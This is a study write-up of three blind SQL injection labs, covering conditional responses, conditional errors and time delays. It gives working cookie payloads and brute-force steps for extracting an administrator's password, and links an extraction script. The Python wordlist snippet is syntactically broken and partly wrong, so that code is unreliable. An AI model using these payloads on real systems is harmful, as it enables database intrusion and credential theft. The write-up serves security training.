# Blind SQL injection

Blind sql injection arises when an application vulnerable to SQL injection without returning the relevant result from SQL query.

## Lab #1: Blind SQL injection with conditional responses


Example SQL query:
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
``` 
Example injected SQL query with `' AND '1'='1`:

```

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4[' AND '1'='1]'
```

Steps:
1. Identify page length with and without "Welcome back!" message

```
' AND '1'='1
' AND '1'='2 
```
3. Determine password length

```
' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 8) = 'a
' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) < 21) = 'a
```

5. Extract the password

```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1,1) = 'a
```

Pseudo:
```
index = 1 
while True:
	for char in chars:
	cookies = {
		"TrackingId" : "' AND SUBSTRING((SELECT password FROM users WHERE
		username 'administrator'),{index},1) = '{char}'"
	}
	resp = requests.get(url, cookies)
	if resp contains "welcome":
		password += char
		index += 1
		
```
Automated script in the scripts folder.

## Lab #2: Blind SQL injection with conditional errors

Steps:
1. Determine the database version

```
TrackingId=abc' ORDER BY 1 --
TrackingId=abc' UNION SELECT banner FROM v$version --
```

2. Although there's no difference in query result beside internal error which means injection failed, I will keep the whole TrackingId for consistency.

Returns no error:
```
TrackingId=abc' AND (SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a 
```

Returns error:
```
TrackingId=abc' AND (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a

' AND (SELECT CASE WHEN (SUBSTR('administrator',1,1)='b') THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a
```

3. This third step just me figuring out how the oracle query works.
```
# return errors
# means it's false, password not started with A.
' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users where username='administrator'),1,1)='A') THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a
```

4. Determine password length
```
Returns error (TRUE that password length is lower than 21):
' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator') < 21) THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a

Returns error (TRUE that password length is greater than 8):
' AND (SELECT CASE WHEN (LENGTH(SELECT password FROM users WHERE username='Administrator') > 8) THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a
```

5. Brute force.

```
' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),§P1§,1) = '§P2§') THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a
```

**With Burpsuite Intruder:**

P1 = Index = 1-21  
P2 = Chars = 0-9+a-z+A-Z

Create wordlist using python

```python
import string

p1=list(range(1,21)) # [1,2,3...,19, 20]
p2=string.digits+string.ascii_letters # [012..abc..XYZ]

# Payload for p1
for i in range p1:
	print(i)

for c in range p2:
	print(c)
```

Paste wordlist to Burpsuite intruder, use P1 in payload 1, P2 in payload 2.

**Using my multithread script (took less than 5 minutes):**

 https://gist.github.com/fahmifj/13d055117f729a233a8f4ccbefdb1680

## Lab #3: Blind SQL injection with time delays

Assume the query is:

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Since it's a blind sql, using Payload list is my first option

```
' AND 5=(SELECT 5 FROM PG_SLEEP(10))
``` 

And here is the lab solution using string concatenation.

```
'||pg_sleep(10) --
```

Interesting..

Reference
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-time-based
